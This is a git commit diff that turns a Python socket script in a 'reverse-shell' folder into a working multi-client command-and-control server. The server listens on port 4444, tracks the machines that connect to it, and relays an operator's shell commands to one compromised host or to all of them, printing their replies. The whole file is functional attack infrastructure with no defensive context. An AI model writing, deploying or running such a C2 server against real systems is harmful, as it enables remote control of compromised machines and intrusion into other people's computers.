c9d04168687082782ffdda1e19ad9e1fcf4b8cd7
Joseph Abbate <josephabbateny@gmail.com>
2022-02-04 01:27:34 -0500

    Functional C2 Socket Server
    The > location is a little fucked, but thats it

--- reverse-shell/C2_Server.py
+++ reverse-shell/C2_Server.py
@@ -1,52 +1,68 @@
+import cmd
 import socket
-import selectors
-import types
-sel = selectors.DefaultSelector()
+import os
+from _thread import *
+import re
 
-host = "172.16.44.1"
+ServerSocket = socket.socket()
+host = '172.16.44.1'
 port = 4444
-
-lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-lsock.bind((host, port))
-lsock.listen()
-print('listening on', (host, port))
-lsock.setblocking(False)
-sel.register(lsock, selectors.EVENT_READ, data=None)
-
-def accept_wrapper(sock):
-    conn, addr = sock.accept()  # Should be ready to read
-    print('accepted connection from', addr)
-    conn.setblocking(False)
-    data = types.SimpleNamespace(addr=addr, inb=b'', outb=b'')
-    events = selectors.EVENT_READ | selectors.EVENT_WRITE
-    sel.register(conn, events, data=data)
-
-def service_connection(key, mask):
-    sock = key.fileobj
-    data = key.data
-    if mask & selectors.EVENT_READ:
-        recv_data = sock.recv(1024)  # Should be ready to read
-        if recv_data:
-            data.outb += recv_data
-        else:
-            print('closing connection to', data.addr)
-            sel.unregister(sock)
-            sock.close()
-    if mask & selectors.EVENT_WRITE:
-        if data.outb:
-            print('echoing', repr(data.outb), 'to', data.addr)
-            sent = sock.send(data.outb)  # Should be ready to write
-            data.outb = data.outb[sent:]
+ThreadCount = 0
+cmd_queue={}
+connections = []
 try:
+    ServerSocket.bind((host, port))
+except socket.error as e:
+    print(str(e))
+
+print('Waitiing for a Connection..')
+ServerSocket.listen(5)
+
+def threaded_client(connection, num):
+    global cmd_queue
+    cmd_queue[num] = None
     while True:
-        events = sel.select(timeout=None)
-        for key, mask in events:
-            if key.data is None:
-                accept_wrapper(key.fileobj)
-            else:
-                service_connection(key, mask)
-except KeyboardInterrupt:
-    lsock.close()
+        if cmd_queue[num]:
+            connection.send(str.encode(cmd_queue[num]))
+            if cmd_queue[num] == 'exit':
+                break
+            data = str(connection.recv(1024),"UTF-8")
+            print()
+            print(num,":",data)
+            cmd_queue[num] = None
+    connection.close()
 
+def connectionManagement():
+    global ThreadCount
+    while True:
+        Client, address = ServerSocket.accept()
+        print('Connected to: ' + address[0] + ':' + str(address[1]))
+        connections.append(address[0] + ':' + str(address[1]))
+        start_new_thread(threaded_client, (Client, ThreadCount, ))
+        ThreadCount += 1
+        print('Thread Number: ' + str(ThreadCount))
+        print("> ", end = "")
 
+start_new_thread(connectionManagement, ())
 
+while True:
+    data = input("> ")
+    if data == "list":
+        for i in range(len(connections)):
+            print(i, ":", connections[i])
+    elif data == "exit":
+        for i in range(ThreadCount):
+            cmd_queue[i] = "exit"
+        break
+    elif data[:3] == "all":
+        for i in range(ThreadCount):
+            cmd_queue[i] = data[3:]
+    else:
+        try:
+            nums = re.findall("\d*",data)
+            num_size = len(nums[0])
+            cmd_queue[int(nums[0])] = data[num_size:].strip()
+        except:
+            pass
+
+ServerSocket.close()
